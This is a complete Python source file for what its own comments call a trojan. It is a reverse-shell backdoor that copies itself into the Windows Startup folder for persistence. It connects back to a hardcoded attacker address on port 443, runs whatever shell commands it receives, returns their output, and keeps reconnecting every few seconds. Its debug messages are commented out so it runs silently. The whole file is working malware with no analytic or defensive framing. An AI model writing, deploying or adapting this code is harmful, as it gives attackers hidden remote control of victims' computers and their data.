import socket
from time import sleep
import subprocess
import threading
import os

IP = "10.0.2.5" # change it!!
PORT = 443 # change it?

# Copy the trojan to the startup folder on Windows
def autorun():
    filename = os.path.basename(__file__)
    exe_filename = filename.replace(".py", ".exe")
    os.system(f"copy {exe_filename} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programas\\Startup\"")

def connect(IP,PORT):
    try:
        # print(f"[*] Trying to connect to {IP}:{PORT}...")
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((IP,PORT))
        # print("[+] Connected!")
        return client
    except Exception as error:
        # print(f"[-] Connection error: {error}")
        return None

def cmd(client, data):
    try:
        # print(f"[*] Running command: {data}")
        # Allows the code to continue performing other tasks while the cmd function runs separately
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        # Read and send the command output
        output = proc.stdout.read() + proc.stderr.read()
        client.send(output + b"\n")
    except Exception:
        # print(f"[-] Cmd error: {error}")
        pass

def listen(client):
    try:
        # print("[*] Listening for commands...")
        while True:
            data = client.recv(1024).decode().strip()
            if data == "/exit":
                # print("[-] Closing connection...")
                client.close()
                exit()
            else:
                threading.Thread(target=cmd, args=(client, data)).start()
    except Exception as error:
        # print(f"[-] Listening error: {error}")
        client.close()

# While the trojan is running, it will always try to connect to the server
if __name__ == "__main__":
    autorun()
    # os._exit(0)
    while True:
        client = connect(IP, PORT)
        if client:
            listen(client)
        else:
            # print("[!] Connection failed. Retrying in 3 seconds...")
            sleep(3)
